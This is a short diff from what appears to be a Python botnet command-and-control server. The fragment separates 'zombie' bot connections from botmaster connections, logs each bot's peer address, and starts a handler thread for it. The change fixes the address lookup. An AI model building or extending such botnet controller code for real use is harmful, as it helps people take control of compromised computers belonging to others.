@@ -77,7 +77,7 @@ if __name__ == '__main__':
             data = client_socket.recv(1).decode()  # info about which client type is connected 1-bot 2-botmaster
             if int(data) == 1:
                 print('normal bot connected')
-                sqlDatabase.append(client_socket.getsockname())
+                sqlDatabase.append(client_socket.getpeername())
                 print(sqlDatabase)
                 start_new_thread(thread_for_zombieBot, (client_socket, addr))
             if int(data) == 2:
